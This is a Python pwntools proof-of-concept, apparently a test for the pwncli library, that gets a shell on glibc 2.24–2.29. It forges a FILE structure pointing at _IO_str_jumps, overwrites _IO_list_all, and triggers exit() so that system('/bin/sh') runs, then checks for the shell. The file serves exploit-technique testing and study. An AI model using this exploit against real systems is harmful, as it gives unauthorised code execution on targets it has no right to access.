"""getshell_by_str_jumps_finish_when_exit 的 POC（libc 2.24-2.29）

Technique: Forge IO_FILE with vtable pointing to _IO_str_jumps - 8, so that
_IO_OVERFLOW calls _IO_str_finish which calls *(vtable+0x18) = system("/bin/sh")

Trigger: exit() -> _IO_flush_all_lockp -> _IO_OVERFLOW -> _IO_str_finish
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.24-3ubuntu2.2"


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    system = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    # Find _IO_str_jumps: typically at _IO_file_jumps + 0xc0
    _IO_file_jumps = libc.sym['_IO_file_jumps']
    _IO_str_jumps = _IO_file_jumps + 0xc0
    log.info(f"_IO_str_jumps: {hex(_IO_str_jumps)}")

    # Allocate chunk for fake FILE
    fp_addr = alloc(io, 0, 0x100)
    log.info(f"fake FILE at: {hex(fp_addr)}")

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.getshell_by_str_jumps_finish_when_exit(
        _IO_str_jumps_addr=_IO_str_jumps,
        system_addr=system,
        bin_sh_addr=bin_sh,
    )

    # Write the fake FILE struct
    edit(io, 0, payload.ljust(0x100, b'\x00'))

    # Point _IO_list_all to our fake FILE
    _IO_list_all = libc.sym['_IO_list_all']
    arb_write(io, _IO_list_all, p64(fp_addr))

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("getshell_by_str_jumps_finish_when_exit: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("getshell_by_str_jumps_finish_when_exit: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
